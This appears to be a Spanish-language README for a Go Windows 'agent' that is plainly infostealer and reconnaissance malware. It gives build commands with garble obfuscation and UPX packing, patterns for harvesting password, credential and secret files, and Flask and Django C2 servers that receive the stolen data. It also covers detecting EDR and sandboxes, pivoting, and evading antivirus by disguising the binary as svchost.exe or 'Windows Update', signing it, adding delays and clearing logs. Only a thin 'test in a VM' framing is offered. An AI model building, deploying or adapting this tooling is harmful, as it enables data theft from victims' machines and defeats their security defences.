# Guía de Uso del Agente

## Compilación

### 1. Compilación Rápida
```bash
chmod +x build.sh
./build.sh
```

Esto generará varios ejecutables:
- `agent.exe` - Versión básica
- `agent_optimized.exe` - Versión optimizada (más pequeña)
- `agent_compressed.exe` - Versión comprimida con UPX (si está disponible)
- `agent_obfuscated.exe` - Versión ofuscada con garble (si está disponible)

### 2. Compilación Manual

**Básica:**
```bash
GOOS=windows GOARCH=amd64 go build -o agent.exe
```

**Optimizada (reducir tamaño):**
```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o agent.exe
```

**Con ofuscación:**
```bash
go install mvdan.cc/garble@latest
GOOS=windows GOARCH=amd64 garble -literals -tiny build -o agent.exe
```

## Configuración del Servidor C2

### Opción 1: Variables de Entorno
```bash
export SERVER_URL="http://tu-servidor.com:8080/content"
export DEBUG=1
```

### Opción 2: Modificar config/config.go
```go
serverURL := "http://tu-servidor.com:8080/content"
```

## Ejecución

### En Windows
```cmd
agent.exe
```

### Con Wine (Linux)
```bash
wine agent.exe
```

### En una VM de prueba
1. Copia el ejecutable a la VM
2. Ejecuta como administrador (para funciones avanzadas)
3. Los datos se enviarán automáticamente al servidor

## Personalización

### Modificar patrones de búsqueda de archivos

Edita `main.go` línea 52:
```go
patterns := []string{
    "*.txt",
    "*.doc",
    "*.docx",
    "*.pdf",
    "*.xls",
    "*.xlsx",
    "password",
    "credential",
    "secret",
    "config",
}
```

### Habilitar captura de pantalla

Descomenta en `collectors/sysinfo.go` línea 42:
```go
// Screenshot (puede aumentar el tamaño del payload)
info.Screenshot = utils.CaptureScreenshot()
```

### Añadir más productos EDR

Edita `collectors/edr.go` y añade a la lista `edrProducts`:
```go
{
    name:      "Nuevo EDR",
    processes: []string{"proceso1.exe", "proceso2.exe"},
    drivers:   []string{"driver1.sys", "driver2.sys"},
},
```

### Modificar límites de recopilación

En `collectors/sysinfo.go`:
```go
// Línea 115 y 163 - Conexiones de red
for i := uint32(0); i < numEntries && i < 100; i++ {

// Línea 283 - Servicios
for i := uint32(0); i < servicesReturned && i < 200; i++ {

// Línea 318 - Aplicaciones instaladas
for i := 0; i < 500; i++ {

// Línea 343 - Archivos recientes
if i >= 50 {
```

## Servidor C2 de Ejemplo

### Servidor HTTP simple en Python
```python
from flask import Flask, request
import json

app = Flask(__name__)

@app.route('/content', methods=['POST'])
def receive_data():
    data = request.get_json()
    
    # Guardar en archivo
    hostname = data.get('hostname', 'unknown')
    filename = f"data_{hostname}_{data['timestamp']}.json"
    
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)
    
    print(f"[+] Datos recibidos de {hostname}")
    print(f"[+] Guardado en {filename}")
    
    return {"status": "ok"}, 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

### Servidor con Django (NetonWeb)
```python
# views.py
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import json

@csrf_exempt
def receive_content(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        
        # Guardar en base de datos
        # SandboxData.objects.create(...)
        
        return JsonResponse({"status": "ok"})
    
    return JsonResponse({"error": "Method not allowed"}, status=405)
```

## Análisis de Resultados

### Indicadores de Sandbox/VM

**Alta probabilidad de VM si:**
- `is_vm: true`
- `vm_indicators` contiene archivos de VirtualBox/VMware
- `cpu_temperature: 0.0`
- `window_count < 10`
- `disk_indicators` contiene "VBOX" o "VMware"

**Indicadores de análisis activo:**
- `hooked_functions` con funciones marcadas como `is_hooked: true`
- `suspicious_dlls` no vacío
- EDR/AV detectados con método "process"

### Información útil del sistema

**Para pivoting:**
- `network_connections` - Conexiones activas
- `users` y `groups` - Cuentas disponibles
- `processes` - Software en ejecución

**Para evasión:**
- `edr_info.detected_products` - Productos de seguridad
- `hook_info` - Funciones monitoreadas
- `services` - Servicios de seguridad activos

## Troubleshooting

### Error: "cannot connect to server"
- Verifica que el servidor C2 esté corriendo
- Verifica la URL en la configuración
- Verifica el firewall de la VM

### Error: "Access denied"
- Ejecuta como administrador
- Algunas funciones requieren privilegios elevados

### El ejecutable es muy grande
- Usa la versión optimizada: `agent_optimized.exe`
- Usa UPX para comprimir: `upx --best agent.exe`
- Usa garble para ofuscar y reducir tamaño

### Detectado por antivirus
- Usa ofuscación con garble
- Modifica los strings del código
- Usa técnicas de packing
- Firma el ejecutable con un certificado válido

## Mejores Prácticas

1. **Siempre prueba en un entorno controlado primero**
2. **Usa HTTPS para el servidor C2 en producción**
3. **Implementa autenticación en el servidor**
4. **Limpia los logs después de la ejecución**
5. **Considera añadir un delay antes de la ejecución**
6. **Implementa verificaciones anti-debugging**
7. **Usa nombres de archivo menos sospechosos**

## Evasión Básica

### Renombrar el ejecutable
```bash
mv agent.exe svchost.exe
# o
mv agent.exe update.exe
```

### Añadir metadata de Windows
```bash
# Instalar go-winres
go install github.com/tc-hib/go-winres@latest

# Crear archivo winres.json
go-winres make --product-name "Windows Update" --file-description "System Update Service"

# Recompilar
GOOS=windows GOARCH=amd64 go build -o agent.exe
```

### Delay antes de ejecutar
Añade al inicio de `main()`:
```go
time.Sleep(30 * time.Second) // Esperar 30 segundos
```

## Limpieza

### Eliminar ejecutables
```bash
rm -f *.exe
```

### Limpiar módulos de Go
```bash
go clean -cache -modcache -testcache
```
